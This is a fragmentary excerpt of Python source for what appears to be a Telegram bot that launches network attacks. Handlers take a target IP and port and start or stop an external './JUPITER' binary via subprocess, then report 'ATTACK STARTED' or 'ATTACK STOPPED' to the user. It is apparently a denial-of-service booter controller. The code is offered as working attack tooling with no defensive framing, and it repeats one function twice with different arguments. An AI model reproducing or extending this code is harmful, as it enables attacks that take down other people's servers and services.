...
CREATOR = "This File Is Made By @Hmm_Smokie"
BotCode = "66644bb66aef7093dea3d9d59387e7f9b39a1f59df97730cceceefb3f036e815"
...
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./JUPITER", target_ip, str(target_port), "1", "12"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
...
def run_attack_command_sync(target_ip, target_port, action):
    ...
    if action == 1:  # Start attack
        ...
        process = subprocess.Popen(["./JUPITER", target_ip, str(target_port), "1", "30"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
...
def handle_start_attack(message):
    try:
        ...
        if attack_details:
            ...
            bot.send_message(chat_id, f"*🚀⚡ ATTACK STARTED ⚡🚀*", parse_mode='Markdown', timeout=60)
...
def handle_stop_attack(message):
    try:
        ...
        if attack_details:
            target_ip, target_port = attack_details
            bot.send_message(chat_id, f"*🔴 ATTACK STOPPED 🔴*", parse_mode='Markdown', timeout=60)
